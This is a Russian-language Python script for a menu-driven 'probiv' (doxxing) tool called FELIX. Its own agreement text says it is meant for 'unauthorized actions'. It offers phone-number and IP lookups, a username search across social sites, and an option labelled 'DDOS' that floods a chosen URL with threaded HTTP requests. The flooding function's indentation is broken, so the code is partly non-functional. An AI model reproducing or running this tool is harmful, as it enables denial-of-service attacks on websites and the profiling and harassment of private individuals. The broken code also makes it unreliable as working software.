import os
import datetime
import requests
import phonenumbers
import threading
import urllib.request
import json


def printagreement():
	print("""\033[32mЭто бесплатный инструмент для поиска информации в сети, а также для несанкционированных действий от @deco_x и @Felix_335
@SEALandKlopiksssr

ОТВЕТСТВЕННОСТЬ ЗА ВАШИ ДЕЙСТВИЯ НЕСЕТЕ ИСКЛЮЧИТЕЛЬНО ВЫ. УТИЛИТА СОЗДАНА ДЛЯ ОЗНАКОМИТЕЛЬНЫХ ЦЕЛЕЙ

Поэтому, прежде чем использовать софт  FELIX, взвесьте все возможные риски и последствия.
Мы не рекомендуем использовать данное софт для решения личных конфликтов или для нарушения законодательства.

[!] Чтобы принять соглашение нажмите\033[0m ENTER
	""")
	input()
	os.system('clear')


def check():
	if os.path.exists('agreement.txt'):
		main()
	else:
		printagreement()
		with open('agreement.txt', 'w') as a:
			a.write('Соглашение принято')
		main()


def send_request(url):
    response = requests.get(url)
    print(f"Статус запроса {url}: {response.status_code}")

def load_testing(url, num_requests):
    for _ in range(num_requests):
        send_request(url)

current_datetime = datetime.datetime.now()

year = current_datetime.year
hour = current_datetime.hour
minute = current_datetime.minute
second = current_datetime.second

def function1():
    print("Время: {} {}:{}".format(year,hour, minute, second))
    phone = input("Номер: ")
    try:
        getInfo = "https://htmlweb.ru/geo/api.php?json&telcod=" + str(phone)
        try:
            infoPhone = urllib.request.urlopen(getInfo)
            infoPhone = json.load(infoPhone)
            print("Страна:", infoPhone["country"]["name"])
            print("Регион:", infoPhone["region"]["name"])
            print("Округ:", infoPhone["region"]["okrug"])
            print("Оператор:", infoPhone["0"]["oper"])
            print("Часть света:", infoPhone["country"]["location"])
            print(f"TG: t.me/{phone}")
        except:
            print("\n нічого не знайдено\n")
    except Exception as e:
        print("Произошла ошибка:", e)
    	

def function2():
    print("Время: {} {}:{}".format(year,hour, minute, second))
    url = input("Введите URL веб-сайта: ")
    num_threads = int(input("Введите количество потоков: "))
    total_requests = int(input("Введите общее количество запросов: "))
    threads = []
    for _ in range(num_threads):
    	thread = threading.Thread(target=load_testing, args=(url, total_requests))
threads.append(thread)
thread.start()
for thread in threads:
    	thread.join()

def function3():
    print("Время: {} {}:{}".format(year,hour, minute, second))
    def check_website(url):
        response = requests.get(url)
        if response.status_code == 200:
            print(f"{url} - Status: 200")

    username = input("Введите имя пользователя без @: ")

    sites = [
        f"https://www.instagram.com/{username}",
        f"https://github.com/{username}",
        f"https://t.me/{username}",
        f"https://www.tiktok.com/@{username}",
        f"https://github.com/{username}",
        f"https://www.youtube.com/{username}",
    ]

    for site in sites:
        check_website(site)
    return

def function4():
    print("Время: {} {}:{}".format(year,hour, minute, second))
    def ip_address_lookup(ip_address):
        url = f"https://ipinfo.io/{ip_address}/json"
        response = requests.get(url)

        if response.status_code == 200:
            return response.json()
        else:
            return {"error": "Unable to retrieve information"}

    ip_address = input("Введите IP-адрес для поиска: ")
    result = ip_address_lookup(ip_address)

    if "error" in result:
        print("Произошла ошибка при получении информации")
    else:
        print(f"Информация об IP-адресе {ip_address}:")
        print(f"Страна: {result['country']}")
        print(f"Регион: {result['region']}")
        print(f"Город: {result['city']}")
        print(f"Организация: {result['org']}")

def function5():
    print("Время: {} {}:{}".format(year,hour, minute, second))
    print("Просто обычный ,бесплатный софт со стандартными функциями)\nСоздал:@Felix_335 и @deco_x @SEALandKlopiksssr \nTG: http://t.me/crazyezz")

def function6():
    print("Время: {} {}:{}".format(year,hour, minute, second))
    print("Пишите в тг @Felix_335 или @SEALandKlopiksssr @deco_x ,им же вы и можете предложить дальнейшие обновление:3")

def exit_menu():
    print("Программа завершена.")
    quit()

# Основная функция меню
def main():
    while True:
        print('''

\033[31m░░░█████████░░█████████╗░███╗░░░░░░░███╗░███╚╗░░░░░███╗░\n░░░█████████╗░█████████║░███║░░░░░░░███║░░███║░░░░███╔╝░\n░░░███╔═════╝░█████████║░███║░░░░░░░███║░░███╚╗░░░███║░░\n░░░███╚═════╗░███╔═════╝░███║░░░░░░░███║░░░███║░░███╔╝░░\n░░░█████████║░███╚═════╗░███║░░░░░░░███║░░░███║░░███║░░░\n░░░█████████║░█████████║░███║░░░░░░░███║░░░░░█████══╣░░░\n░░░███╦═════╝░█████████║░███║░░░░░░░███║░░░░███║░███║░░░\n░░░███║░░░░░░░███╔═════╝░███║░░░░░░░███║░░░░███║░███╚╗░░\n░░░███║░░░░░░░███╚═════╗░███║░░░░░░░███║░░███╔╝░░░███║░░\n░░░███║░░░░░░░█████████║░█████████║░███║░░███║░░░░███╚═╗░\n░░░███║░░░░░░░█████████║░█████████║░███║░███╔╝░░░░░░███║░\n░░░╚══╝░░░░░░░╚════════╝░╚════════╝░╚══╝░╚══╝░░░░░░░╚══╝░"\n''')              
        print("")
        print(" 1. Пробив номера     4. Пробив IP     ")
        print(" 2. DDOS              5. О программе   ")
        print(" 3. Пробив ника       6. Помощь        ")
        print("             7. Выход                 ")
        print("")
        choice = input("Выберите опцию: ")

        if choice == '1':
            function1()
            input()
            os.system('clear')
        elif choice == '2':
            function2()
            input()
            os.system('clear')
        elif choice == '3':
            function3()
            input()
            os.system('clear')
        elif choice == '4':
            function4()
            input()
            os.system('clear')
        elif choice == '5':
            function5()
            input()
            os.system('clear')
        elif choice == '6':
            function6()
            input()
            os.system('clear')
        elif choice == '7':
            exit_menu()
        else:
            print("Некорректный выбор. Пожалуйста, повторите.")

if __name__ == '__main__':
	check()